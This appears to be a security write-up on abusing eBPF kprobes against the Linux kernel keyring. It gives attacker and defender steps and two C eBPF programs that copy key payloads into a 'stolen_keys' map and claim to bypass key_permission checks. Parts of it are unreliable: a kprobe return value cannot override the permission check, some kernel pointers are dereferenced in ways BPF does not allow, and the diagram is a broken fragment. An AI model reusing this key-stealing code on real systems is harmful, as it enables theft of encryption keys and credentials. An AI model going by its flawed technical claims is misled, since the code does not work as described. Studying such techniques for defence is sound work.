Keyring Heist: Stealing Secrets from the Linux Keyring

Wut

A compact exploration of how eBPF can twist the Linux kernel keyring subsystem into an attack primitive—maintaining verifier legality while undermining isolation. This technique allows attackers to extract sensitive cryptographic keys, passwords, and other secrets stored in the kernel keyring, even from isolated contexts.

    C[eBPF Program] -->|2. Hook & Intercept| D[Keyring Functions]
    D -->|3. Access Control Check| B

Why

Because eBPF + misconfiguration => broken isolation. The Linux kernel keyring provides a secure way for processes to store and retrieve sensitive cryptographic material and secrets. These keys are often used for disk encryption, secure communications, and authentication. By compromising the keyring, attackers can extract these secrets, potentially leading to data decryption, authentication bypass, or other serious security breaches.

Attacker hat on

  1. Identify a target system with eBPF capabilities and sensitive keyring usage
  2. Map the kernel functions responsible for keyring access control
  3. Develop an eBPF program that hooks into these functions
  4. Load the malicious BPF program with appropriate privileges
  5. Intercept keyring operations to extract sensitive keys
  6. Store extracted keys in eBPF maps for later retrieval
  7. Exfiltrate the keys through covert channels
  8. Use the stolen keys to decrypt data or authenticate as other users/services

Defender hat on

  1. Remove CAP_BPF from untrusted processes and containers
  2. Implement BPF LSM policies to restrict eBPF program loading
  3. Use hardware security modules (HSMs) for critical key operations
  4. Monitor for unexpected eBPF programs attached to keyring functions
  5. Implement integrity verification for keyring subsystems
  6. Consider using eBPF-based security tools that can detect malicious eBPF usage

Conclusion

eBPF is all you need. The ability to intercept and extract sensitive cryptographic material through eBPF creates a particularly dangerous scenario where security boundaries can be completely bypassed. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls, especially in environments where sensitive keys are used.

Technical Details

Keyring Architecture

The Linux kernel keyring provides:

  • Secure storage for cryptographic keys, certificates, and other secrets
  • Access control based on user IDs and permissions
  • Different types of keyrings (user, session, process, thread)
  • Integration with security modules like SELinux
  • APIs for userspace applications to store and retrieve keys

Keys stored in the keyring are protected by kernel memory protections and access control checks, making them more secure than storing secrets in userspace memory.

Exploitation Technique

The exploit leverages eBPF’s ability to attach to kernel functions that implement keyring operations. By intercepting these calls, an attacker can:

  1. Hook key access functions: Attach to functions like key_permission() or keyring_search()
  2. Bypass permission checks: Modify return values to allow access to restricted keys
  3. Extract key material: Capture sensitive data as it’s processed
  4. Monitor key usage: Track when and how keys are used
  5. Maintain stealth: Avoid triggering detection mechanisms

// Simplified eBPF program to extract keys from the kernel keyring
SEC("kprobe/key_get_payload")
int BPF_KPROBE(hook_key_payload, struct key *key)
{
    // Get key information
    u32 key_id;
    char key_desc[MAX_KEY_DESC_LEN];
    
    // Read the key ID and description
    bpf_probe_read(&key_id, sizeof(key_id), &key->serial);
    bpf_probe_read_str(key_desc, sizeof(key_desc), key->description);
    
    // Check if this is a key we're interested in
    // For example, looking for encryption keys or authentication tokens
    if (is_target_key(key_desc)) {
        // Get the key payload
        void *payload;
        unsigned long payload_len;
        
        bpf_probe_read(&payload, sizeof(payload), &key->payload.data);
        bpf_probe_read(&payload_len, sizeof(payload_len), &key->payload.datalen);
        
        // Store the key in our map for later exfiltration
        struct key_data kdata = {0};
        kdata.id = key_id;
        
        // Copy as much of the key as we can
        if (payload_len > sizeof(kdata.data))
            payload_len = sizeof(kdata.data);
            
        bpf_probe_read(kdata.data, payload_len, payload);
        kdata.len = payload_len;
        
        // Store in our map
        u32 idx = 0;
        bpf_map_update_elem(&stolen_keys, &idx, &kdata, BPF_ANY);
    }
    
    return 0;
}

// Hook the key permission function to bypass access controls
SEC("kprobe/key_permission")
int BPF_KPROBE(hook_key_perm, key_ref_t key_ref, unsigned perm)
{
    // Get the key pointer from the reference
    struct key *key;
    key = key_ref_to_ptr(key_ref);
    
    // Check if this is a key we want to access
    char key_desc[MAX_KEY_DESC_LEN];
    bpf_probe_read_str(key_desc, sizeof(key_desc), key->description);
    
    if (is_target_key(key_desc)) {
        // Allow all permissions by returning 0
        return 0;
    }
    
    // Let the original function run for other keys
    return -1;
}

Detection Methods

Defenders should monitor for:

  • Unexpected eBPF programs attached to keyring-related functions
  • Unusual patterns of keyring access
  • Discrepancies between expected access controls and actual key usage
  • Processes accessing keys they shouldn’t have permission to use
  • Suspicious key material appearing in memory or being transmitted

This technique demonstrates why proper eBPF restrictions are critical for maintaining the security of sensitive cryptographic material, especially in environments where key compromise could lead to broader security failures.

Real-world Impact

In practical environments, this technique could allow an attacker to:

  • Extract disk encryption keys
  • Steal authentication tokens and credentials
  • Access encrypted communications
  • Bypass secure boot mechanisms
  • Compromise encrypted containers or volumes

The ability to silently extract keys from the kernel keyring creates a particularly dangerous scenario where encrypted data can be decrypted, secure communications can be compromised, and authentication mechanisms can be bypassed.
